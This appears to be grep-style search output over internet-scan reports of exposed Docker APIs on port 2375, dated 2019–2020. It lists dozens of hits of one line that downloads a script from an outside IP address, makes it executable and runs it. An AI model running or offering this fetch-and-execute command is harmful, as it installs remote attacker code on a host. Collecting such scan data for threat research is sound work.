+C:\Users\<redacted>\Dalek\reports\2020_3_20\-exportproduct_docker_port_2375.json:
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  3530:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_3_26\-exportproduct_docker_port_2375.json:
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4929:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_3_23\-exportproduct_docker_port_2375.json:
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4030:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_3_24\-exportproduct_docker_port_2375.json:
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  4230:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_3_27\-exportproduct_docker_port_2375.json:
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5027:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_3_4\-exportproduct_docker_port_2375.json:
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_3_31\-exportproduct_docker_port_2375.json:
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5831:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_3_30\-exportproduct_docker_port_2375.json:
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  5632:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2020_4_3\-exportproduct_docker_port_2375.json:
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  6329:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_14\47.105.184.193.txt:
+  18:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_14\docker.txt:
+  762:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_15\149.202.54.239.txt:
+  21:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_15\docker.txt:
+  424:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_16\docker.txt:
+  1727:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_28\101.132.165.27.txt:
+  15:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_28\47.105.184.193.txt:
+  18:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_28\docker.txt:
+  30825:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  34408:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_29\101.132.165.27.txt:
+  15:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_29\47.105.184.193.txt:
+  18:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_29\docker.txt:
+  28774:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  32363:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_27\101.132.165.27.txt:
+  15:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  36:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_27\47.105.184.193.txt:
+  18:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  57:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_27\47.96.104.140.txt:
+  15:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_10_27\docker.txt:
+  37875:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  41449:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  53928:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  103122:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  106697:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_12\101.132.165.27.txt:
+  15:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_12\47.105.184.193.txt:
+  18:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_12\docker.txt:
+  59561:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+  63015:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_13\101.132.165.27.txt:
+  15:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
+
+C:\Users\<redacted>\Dalek\reports\2019_11_13\docker.txt:
+  55499:  wget -y;apt-get install wget -y;wget http://185.164.72.119/autom.sh -O /autom.sh;chmod 777 /autom.sh;sh
